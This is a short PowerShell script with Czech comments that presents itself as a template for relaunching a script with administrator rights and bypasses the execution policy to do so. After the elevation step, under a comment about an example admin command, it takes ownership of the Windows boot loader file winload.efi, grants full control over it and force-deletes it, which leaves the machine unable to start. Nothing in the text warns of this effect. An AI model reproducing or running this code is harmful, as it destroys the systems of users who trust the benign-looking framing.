# 1. Kontrola, zda skript již běží jako Administrátor
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    # 2. Pokud nemá práva, spustí novou instanci PowerShellu jako správce a předá jí tento skript
    Write-Host "Tento skript vyžaduje práva správce. Spouštím novou relaci..." -ForegroundColor Yellow
    
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# --- Zde začíná samotný kód, který se spustí až po získání práv správce ---
Write-Host "Skript nyní úspěšně běží s právy administrátora!" -ForegroundColor Green

# Příklad administrátorského příkazu:
# Get-Service

takeown /f "C:\Windows\System32\winload.efi" /a
icacls "C:\Windows\System32\winload.efi" /grant administrators:F

Remove-Item "C:\Windows\System32\winload.efi" -Force

Read-Host "Stisknutím klávesy Enter skript ukončíte"